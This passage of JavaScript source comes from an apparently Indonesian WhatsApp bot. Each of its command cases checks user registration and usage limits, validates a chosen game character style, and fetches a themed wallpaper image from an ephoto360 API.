no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, character : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
	case 'overwatchwallpaper':{
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.maketeamlogo('character', 'brigitte', prefix, command))
if (!text.includes('|')) return reply(lang.maketeamlogo('character', 'brigitte', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
const style = ['ana','ashe','ashe-2','baptiste','baptiste-2','brigitte','dva','dva-2','genji','hanzo','junkrat','lucio','nccree','nei','nercy','nercy-2','nercy-3','noira','pharah','reaper','roadhog','soldier-76','sombra','sombra-2','symmetra','tracer','tracer-2','widowmaker','widowmaker-2','zarya']
if (!style.includes(m2)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Character')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, character : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
	case 'rovwallpaperhd':{
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.maketeamlogo('hero', 'keera', prefix, command))
if (!text.includes('|')) return reply(lang.maketeamlogo('hero', 'keera', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
const style = ['alice-5','arthur-8','dirak-3','errol','grakk-6','keera','lorion','nina-6','tulen-10','yena','zip-3','zuka-9','arum-6','baldum-3','elandorr-3','hayate-5','ilumia-5','ishar-4','lauriel-8','nax-5','nurad-9','quillen-6','teemee-3','telannas-8','yena-4','yena-5','butterfly-10','laville','laville-2','nakroth-7','omen-6','rouie-2','taara-5','zanis-8','zata','zata-2','capheny-4','elsu-6','fennik-5','liliana-7','paine','paine-2','rouie','astrid-4','ata','ata-2','lauriel-8','omen-5','qi-3','roxie-5','taara-5','violet-12','wukong-7','wukong-8','hayate-4','ishar-3','jinna-5','lauriel-7','quillen-5','richter-4','ryoma-6','telannas-8','tulen-9','yorn-7','aleister-4','dirak','dirak-2','grakk-5','kerra','raz-4','athur-7','arum-5','ishar-2','nax-4','natalya-7','valhein-7','zill-5','diaochan-6','ignis-4','lubu-8','naloch-7','sephera-4','elandorr','elandorr-2','krizzix','krizzix-2','violet-11','yena-3','arduin-4','enzo-3','errol-3','hayate-3','krixi-7','nurad-8','volkath','volkath-2','wisp-4','wukong-6','gildur-4','ishar','nurad-7','quillen-4','tulen-8','lauriel-6','qi','qi-2','darcy-3','florentino-3','noren-3','ryoma-5','sephera-3','annette-4','capheny-3','elsu-5','narja-3','veres-3','violet-10','zip-2','zip-3','diaochan-5','enzo-2','lubu-7','payna-4','roxie-4','violet-9','zanis-7','zephys-6','enzo','liliana-6','lindis-5','xeniel-5','airi-9','errol-2','yena-2','zuka-8','zephys-3','zephys-2','zephys','zanis-5','zanis-4','zanis-3','zanis-2','zanis','violet-5','violet-4','violet-3','violet-2','violet','veera-4','veera-3','veera-2','valhein-3','valhein-2','valhein','thane-2','thane','nina-3','nina-2','nina','nganga-2','nganga','lubu-5','lubu-4','lubu-3','lubu-2','lubu','krixi-5','krixi-4','krixi-3','krixi-2','krixi','kahlii-3','kahlii-2','kahlii','diaochan-3','diaochan-2','diaochan','chaugnar','butterfly-5','butterfly-4','butterfly-2','butterfly','yorn-4','yorn-3','yorn-2','yorn','wukong-3','wukong-2','wukong','toro-2','toro','taara-2','taara','slimz-3','slimz-2','slimz','payna-2','payna','ormarr-4','ormarr-3','ormarr-2','kaisa-2','ormarr','natalya-5','natalya-4','natalya-3','natalya-2','natalya','nakroth-4','nakroth-3','nakroth-2','nakroth','naloch-3','naloch-2','naloch','lumburr','kriknak-2','kriknak','jinna-2','jinna','grakk-3','grakk-2','grakk','gildur-2','gildur','fennik-4','fennik-3','fennik-2','fennik','cresht','azzenka-2','azzenka','arthur-3','arthur-2','arthur','alice-2','alice','aleister-2','aleister','zuka-2','zuka','zill-2','zill','xeniel-2','xeniel','wonderwoman-2','wonderwoman','telannas-4','telannas-3','telannas-2','telannas','superman-2','superman','skud-2','skud','ryoma-2','ryoma','preyta-3','preyta-2','preyta','nurad-3','nurad-2','nurad','noren-2','noren','lauriel-4','lauriel-3','lauriel-2','lauriel','kilgroth-2','kilgroth','joker','illumia-3','illumia-2','illumia','ignis-2','ignis','batman-2','batman','astrid-2','astrid','arduin-2','arduin','airi-5','airi-4','airi-3','airi-2','airi','teemee-2','teemee','zuka-3','tulen','raz-2','raz','naloch-4','lumburr-2','lindis-2','joker-2','grakk-4','gildur-3','toro-3','omen-2','omen','zuka-4','tulen-2','nakroth-5','nax','liliana','zill-3','raz-3','liliana-2','tulen-3','telannas-5','taara-3','ryoma-3','nax-2','kriknak-3','flash','cresht-3','cresht-2','arthur-4','aleister-3','airi-6','arum-2','arum','wisp-2','wisp','rourke-2','rourke','narja-2','narja','butterfly-6','batman-3','astris-3','jinna-3','butterfly-7','arthur-5','valhein-4','superman-3','liliana-3','kilgroth-3','roxie-2','roxie','wukong-4','baldum-2','baldum','zephys-4','annette-2','annette','alice-3','telannas6','raz-4','nurad-6','nurad-5','jinna-4','amily','ybneth-2','ybneth','ilumia-4','amily-2','xeniel-3','veera-5','liliana4','flash-2','arthur-6','omen-3','lindis-3','elsu-2','elsu','richter-2','richter','nina-4','wirosableng','thane-3','ryoma-4','quillen-2','quillen','lauriel-5','arum-3','wisp-3','violet-7','sephera-2','sephera','naloch-5','krixi-6','alice-4','tulen-5','skud-3','rourke-3','nakroth-6','florentino-2','florentino','elsu-3','butterfly-8','amily-3','zuka-7','zuka-6','yorn-6','yorn-5','veres-2','veres','naloch-6','cresht-4','azzenka-3','airi-7','zephys-5','yorn-7','violet-8','valhein-5','tulen-6','thane-4','roxie-3','nakroth-7','kahlii-4','elsu-4','darcy-2','darcy','capheny','zill-4','hayate-2','hayate','cresht-5','annette-3','amily-4','tulen-7','telannas-7','omen-4','lindis-4','liliana-5','ignis-3','errol','capheny-2','arum-4','zanis-6','wukong-5','thane-5','slimz-4','skud-4','richter-3','quillen-3','azzenka-4','arduin-3','airi-8']
if (!style.includes(m2)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Hero')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, hero : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
	case 'rovwallpaper':{
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.maketeamlogo('avatar', 'lorion', prefix, command))
if (!text.includes('|')) return reply(lang.maketeamlogo('avatar', 'lorion', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
const style = ['alice-5','arthur-8','dirak-3','errol','grakk-6','keera-2','lorion','grakk-6','keera-2','lorion','nina-6','tulen-10','yena','zip-3','zuka-9','dextra','dextra-2','lindis-6','nurad-10','nakroth-9','quillen-7','sephera-5','yorn-8','airi-10','amily-6','astrid-6','ata-3','capheny-5','darcy-4','diaochan-8','hayate-6','lauriel-10','laville-3','rourke-4','ryoma-7','sinestrea','sinestrea-2','telannas-9','thorne','thorne-2','veres-4','yena-6','zephys-7','allain','allain-2','butterfly-12','kahlii-6','nakroth-8','preyta-4','taara-7','valhein-8','arum-6','baldum-3','elandorr-3','hayate-5','ilumia-5','ishar-4','lauriel-8','nax-5','nurad-9','quillen-6','teemee-3','telannas-8','yena-4','yena-5','butterfly-10','laville','laville-2','nakroth-7','omen-6','rouie-2','taara-6','zanis-8','zata','zata-2','capheny-4','elsu-6','fennik-5','liliana-7','paine','paine-2','rouie','astrid-4','ata','ata-2','lauriel-8','omen-5','qi-3','taara-5','violet-12','wukong-7','wukong-8','hayate-4','ishar-3','jinna-5','kerra-2','lauriel-7','quillen-5','richter-4','ryoma-6','telannas-8','tulen-9','yorn-7','aleister-4','dirak','dirak-2','grakk-5','keera','raz-4','ishar-2','nax-4','valhein-7','zill-5','arthur-7','rum-5','lubu-8','naloch-7','sephera-4','diaochan-6','ignis-4','elandorr','elandorr-2','krizzix','krizzix-2','violet-11','yena-3','arduin-4','enzo-3','errol-3','hayate-3','nurad-8','volkath','volkath-2','wisp-4','wukong-6','celica','gildur-4','ishar','nurad-7','quillen-4','tulen-8','qi','qi-2','darcy-3','florentino-3','noren-3','ryoma-5','sephera-3','elsu-5','narja-3','annette-4','capheny-3','veres-3','zip-2','zip','diaochan-5','enzo-2','lubu-7','payna-3','roxie-4','violet-9','zanis-7','zephys-6','enzo','liliana-6','lindis-5','xeniel-5','errol','yena-2','zuka-8','valhein','violet','airi','skud','zanis','zephis','butterfly','wukong','taara','nakroth','prayta','yorn','natalya','thane','toro','ormarr','omega','nina','nganga','lubu2','lubu','kahlii-2','kahlii','fennik-2','fennik','diaochan','cresht','azzenka','aleister','zuka2','zuka','payna-2','payna','nakroth-2','nortos-2','nortos','kriknak','jinna-2','jinna','batman','airi-2','violet-3','violet-2','skud-2','raz-2','raz','ignis-2','ignis','gildur','butterfly-4','butterfly-3','zanis-2','nurad','yorn-2','slimz','ormarr-2','nurad-2','nina-2','lauriel-2','grakk-2','grakk','diaochan-2','airi-3','zill-2','zill','zanis-3','yorn-3','veera-3','veera-2','thane-2','telannas','superman','naloch-2','krixi-3','butterfly-5','violet-5','veera-4','telannas-2','taara-2','joker','ilumia-2','batman-2','arduin-2','arduin','wukong-2','nakroth-3','ilumia-3','arthur','ryoma-2','ryoma','astrid-2','astrid','zephis-2','natalya-3','natalya-2','ubu-3','chaugnar','azzenka-2','zanis-4','wukong-3','noren','lubu-4','lauriel-3','aleister-2','nurad-3','noren-2','lubu-5','kilgroth','gildur-2','fennik-3','lauriel-4','zephys-3','xeniel-2','wonderwomen','superman-2','slimz-2','natalya-4','krixi-5','krixi-4','zanis-5','yorn-4','xeniel','wonderwoman-2','violet-4','preyta2','diaochan-3','airi-4','valhein-4','preyta-3','nina-3','alice-2','airi-5','telannas-3','ormarr-4','ormarr-3','nakroth-4','kilgroth-2','kahlii-3','grakk-3','natalya-5','fennik-4','teemee-2','teemee','lindis','zuka-3','valhein-2','tulen','toro-2','naloch-4','naloch-3','lumburr','lindis-2','grakk-4','gildur-3','toro-3','omen-2','omen','zill-3','telannas-','athur-4','zuka-4','tulen-2','nakroth-5','nax','liliana','raz-3','liliana-2','tulen-3','nax-2','flash','cresht-3','cresht-2','chaugnar-2','aleister-3','ryoma-3','kriknak-3','airi-6','wisp-2','wisp','batman-3','arum-2','arum','butterfly-6','rourke-2','rourke','narja-2','narja','taara-3','jinna-3','butterfly-7','arthur-4','arthur-3','arthur-2','valhein-3','superman-3','liliana-3','kilgroth-3','roxie-2','roxie','wukong-4','baldum-2','baldum','zephys-4','annette-2','annette','alice-3','telannas6','raz-4','nurad-6','nurad-5','jinna-4','amily','ybneth-2','ybneth','ilumia-4','astrid-3','amily-2','liliana-4','xeniel-5','veera-5','flash-2','athur-5','omen-3','lindis-3','elsu-2','elsu','richter-2','richter','nina-4','wirosableng','thane-3','ryoma-4','quillen-2','quillen','lauriel-5','arum-3','wisp-3','violet-7','sephera-2','sephera','naloch-5','krixi-6','alice-4','tulen-5','skud-3','rourke-3','nakroth-6','florentino-2','florentino','elsu-3','utterfly-8','amily-3','zuka-7','zuka-6','yorn-6','yorn-5','veres-2','veres','naloch-6','cresht-4','azzenka-3','airi-7','zephys-5','yorn-7','violet-8','valhein-5','tulen-6','thane-4','roxie-3','nakroth-7','kahlii-4','elsu-4','darcy2','darcy','capheny','zill-4','hayate-2','hayate','cresht-5','annette-3','amily-4','tulen-7','telannas-7','omen-4','lindis-4','liliana-5','ignis-3','errol','capheny-2','arum-4','zanis-6','wukong-5','thane-5','slimz-4','skud-4','richter-3','quillen-3','azzenka-4','arduin-3','airi-8']
if (!style.includes(m2)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Avatar')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, avatar : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
case 'beautifulgalaxylol':{
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.maketeamlogo('style', 'akali-2', prefix, command))
if (!text.includes('|')) return reply(lang.maketeamlogo('style', 'akali-2', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
const style = ['ashe-2','darius-2','hecarim-2','akali-2','jhin-2','jinx-2','kaisa-2','khazix-2','nordekaiser-2','pantheon-2','qiyana','rammus-2','renekton-2','tahmkench-2','teemo-2','udyr-2','yasuo-2','yuumi','drmundo','zyra','zoe','zilean','ziggs','zed','zac','yorick','yasuo','xinzhao','xerath','xayah','wukong','warwick','volibear','vladimir','viktor','vi','velkoz','veigar','vayne','varus','urgot','udyr','twitch','twistedfate','tryndamere','trundle','tristana','thresh','teemo','taric','talyah','talon','tahmkench','syndra','swain','soraka','sona','skarner','sivir','sion','singed','shyvana','shen','shaco','sejuani','ryze','rumble','riven','rengar','renekton','reksai','rammus','rakan','quinn','poppy','pantheon','ornn','orianna','olaf','nunu','nocturne','nidalee','nautilus','nasus','nami','norgana','norderkaiser','nissfortune','nasteryi','nalzahar','nalphite','lux','lulu','lucian','lissandra','leona','leesin','leblanc','kogmaw','kled','kindred','khazix','kennen','kayn','kayle','katarina','kassadin','karthus','karma','kalista','kaisa','jinx','jhin','jayce','jax','jarvaniv','janna','ivern','irelia','illaoi','heimerdinger','hecarim','graves','gragas','gnar','garen','gangplank','galio','fizz','fiora','fiddlesticks','ezreal','evelynn','elise','ekko','draven','diana','darius','corki','chogath','cassiopeia','camille','caitlyn','braum','brand','blitzcrank','bard','azir','aurelionsol','ashe','annie','anivia','amumu','alistar','akali','ahri','aatrox','sylas','pyke','nunuwillump','neeko','norgana-2','kayle-2','akali-2','aatrox-2']
if (!style.includes(m2)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Style')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, style : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
	case 'crossfirecover':{
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.maketeamlogo('character', 'blthefates', prefix, command))
if (!text.includes('|')) return reply(lang.maketeamlogo('character', 'blthefates', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
const style = ['spop','swat','switcher','redpower','whitenurse','blthefates','jns','natahari','dx','nursezombie','omohswat','sfg','fox','bllaswat','bljtf','grjtf','blarch','hero-4','gsg9','hero-3','opes','abf','shadows','devilhunter']
if (!style.includes(m2)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Character')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, character : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
	case 'lolwallpaper':{
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.maketeamlogo('wallpaper', 'braum', prefix, command))
if (!text.includes('|')) return reply(lang.maketeamlogo('wallpaper', 'braum', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
const style = ['aatrox-2','arhi-2','akali-3','akali-2','braum','camille','evelynn-5','ezreal-2','fizz','graves-2','irelia-3','irelia-2','jayce-2','jhin-2','jinx-2','kaisa','katarina-2','lux-2','neeko','orianna-2','pantheon','pyke','qiyana','riven-2','sylas','teemo-2','viktor','vladimir','warwick-2','yasuo-3','yasuo-2','zoe','nasteryi','lux','lulu','leesin','jinx','jhin','ezreal','janna','ashe','arhi','poppy','nissfortune','soraka','syndra','zyra','yasuo','vi','vayne','taliyah','sona','sivir','shyvana','riven','quinn','nidalee','norgana','leblanc','kennen','karma','irelia','fiora','elise','diana','caitlyn','zed','xayah','tristana','talon','shen','rakan','orianna','nami','kayn','kayle','katarina','kalista','ekko','azir','udyr','thresh','tf','teemo','ryze','nocturne','lucian','khazik','graves','darius','annie','akali','zilean','ziggs','yorick','warwick','nasteryi-2','janna-2','hecarim','gangplank','fiora-2','draven','brand','aatrox','velkoz','shaco','rengar','reksai','ornn','leona','kindred','jayce','jax','jarvan-iv','garen','xinzhao','nasus','kled','evelynn-4','evelynn-3','evelynn-2','evelynn','cassiopeia','zac','xerath','wukong','velkoz-2','veigar','varus','urgot','twich','kassadin','elise-2','annie-2','alistar']
if (!style.includes(m2)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Wallpaper')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, wallpaper : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
	case 'coverdota2':{
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.maketeamlogo('heroes', 'warlord', prefix, command))
if (!text.includes('|')) return reply(lang.maketeamlogo('heroes', 'warlord', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
const style = ['void','riki','lycan','ursa','zeus','dragonkinght','warlord','phantomassassin','bountyhunter','antimage','spectre','luna','vengerfulspirit','undying','tusk','tinker','shadowfiend','sandking','nightstalker','nagasiren','nirana','neepo','lina','juggernaut','huskar','emberspirit','emberspirit','emberspirit','earthshaker','drowranger','clockwerk','bristleback','bloodseeker','axe']
if (!style.includes(m2)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Heroes')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, heroes : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
	case 'coverleagueofking':{
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.maketeamlogo('character', 'ngangar', prefix, command))
if (!text.includes('|')) return reply(lang.maketeamlogo('character', 'ngangar', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
const style = ['thane','orrmarr','omega','nakroth','nina','ngangar','gildur','dieuthuyen','chaugnar','butterfly','azzenka','alice','lubo','kriknak-2','natalya-2','trieu-van','taara-2','naloch','kriknak','natalya','taara','ngo-khong','airi','butterfly-2','butterfly-3','kahlii','krixi','toro','grakk','ilumia','zephys','veera-2','violet','preyta-2','violet-2','valhein','yorn','veera','notos','valhein-2','preyta','illumia-2','fennik-2','lumburr','fennik','nakroth-2','krixi-2','gildur2']
if (!style.includes(m2)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Character')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, character : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
	case 'avatar3q360':{
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.maketeamlogo('avatar', 'truong_phi', prefix, command))
if (!text.includes('|')) return reply(lang.maketeamlogo('avatar', 'truong_phi', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
const style = ['tieu_kieu','luu_bi','truong_oanh_oanh','truong_phi','tu_ma_y','van_uong','hoang_nguyet_anh','hoang_nguyet_anh2','hoang_trung','hua_chu','truong_giac','dieu_thuyen','renekton','tahmkench','teemo','udyr','yasuo','yuumi','drmundo','zyra','zoe','zilean','ziggs','zed','zac','yorick','yasuo','xinzhao','xerath','xayah','wukong','warwick','volibear','vladimir','viktor','vi','velkoz','veigar','vayne','varus','urgot','udyr','twitch','twistedfate','tryndamere','trundle','tristana','thresh','teemo','taric','talyah','talon','tahmkench','syndra','swain','soraka','sona','skarner','sivir','sion','singed','shyvana','shen','shaco','sejuani','ryze','rumble','riven','rengar','renekton','reksai','rammus','rakan','quinn','poppy','pantheon','ornn','orianna','olaf','nunu','nocturne','nidalee','nautilus','nasus','nami','norgana','norderkaiser','nissfortune','nasteryi','nalzahar','nalphite','lux','lulu','lucian','lissandra','leona','leesin','leblanc','kogmaw','kled','kindred','khazix','kennen','kayn','kayle','katarina','kassadin','karthus','karma','kalista','kaisa','jinx','jhin','jayce','jax','jarvaniv','janna','ivern','irelia','illaoi','heimerdinger','hecarim','graves','gragas','gnar','garen','gangplank','galio','fizz','fiora','fiddlesticks','ezreal','evelynn','elise','ekko','draven','diana','darius','corki','chogath','cassiopeia','camille','caitlyn','braum','brand','blitzcrank','bard','azir','aurelionsol','ashe','annie','anivia','amumu','alistar','akali','ahri','aatrox','sylas','pyke','nunuwillump','neeko','norgana','kayle','akali','aatrox']
if (!style.includes(m2)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Avatar')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, avatar : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
	case 'coverofwarface':{
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.maketeamlogo('character', 'warface', prefix, command))
